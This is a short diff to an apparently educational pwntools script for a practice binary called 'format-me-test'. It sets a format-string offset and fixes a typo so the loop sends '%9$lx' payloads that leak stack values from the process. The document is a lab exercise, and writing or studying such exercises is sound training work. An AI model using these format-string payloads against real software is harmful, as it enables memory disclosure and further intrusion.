@@ -9,12 +9,13 @@ exe = ELF("./format-me-test")
 
 r = process([exe.path])
 # r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
+FORMAT_OFFSET = 9
 
 for _ in range(10):
     # Add your code Here
     r.recvuntil(b"Recipient? ") # Think about what should be received first?
     format_string= f"%{FORMAT_OFFSET}$lx".encode()
-    r.sendline(format)string) # Add your format string code here!
+    r.sendline(format_string) # Add your format string code here!
     
     response = r.recvuntil(b"...\n")
     response_str = response.decode()
